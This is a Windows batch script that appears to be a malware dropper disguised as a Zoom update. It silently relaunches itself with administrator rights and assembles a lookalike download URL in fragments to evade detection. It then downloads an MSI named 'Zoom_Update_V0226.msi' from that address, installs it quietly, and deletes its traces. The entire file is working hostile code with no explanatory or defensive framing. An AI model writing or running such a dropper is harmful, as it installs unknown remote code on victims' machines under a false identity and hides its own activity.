@echo off
setlocal EnableDelayedExpansion

if "%~1" neq ('hid' + 'den') (
    powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -ArgumentList ('hid'+'den') -Verb RunAs"
    exit /b
)

set "d1r_x=%TEMP%"
set "ps_scr=%d1r_x%\t_%RANDOM%.ps1"
set "msi_dat=%d1r_x%\s_%RANDOM%.msi"
set "log_dat=%d1r_x%\i_log.txt"

(
echo $prt1 = "https://zoom-us02web-us.sharepoint"
echo $prt2 = "-externals.com"
echo $prt3 = "/j/98765432101/Zoom_Update_V0226.msi"
echo $data_url = $prt1 + $prt2 + $prt3
echo $dest_path = "%msi_dat%"
echo try {
echo     $web_obj = New-Object System.Net.WebClient
echo     $web_obj.DownloadFile($data_url, $dest_path^)
echo     $arg_str = "/i `" + $dest_path + "`" + " /quiet /norestart /L*v %log_dat%"
echo     $proc_obj = Start-Process msiexec.exe -ArgumentList $arg_str -Wait -PassThru
echo     exit $proc_obj.ExitCode
echo } catch {
echo     exit 99
echo }
) > "%ps_scr%"

powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%ps_scr%"
set "res_code=%ERRORLEVEL%"

del /f /q "%ps_scr%" >nul 2>&1
del /f /q "%msi_dat%" >nul 2>&1

endlocal
exit /b %res_code%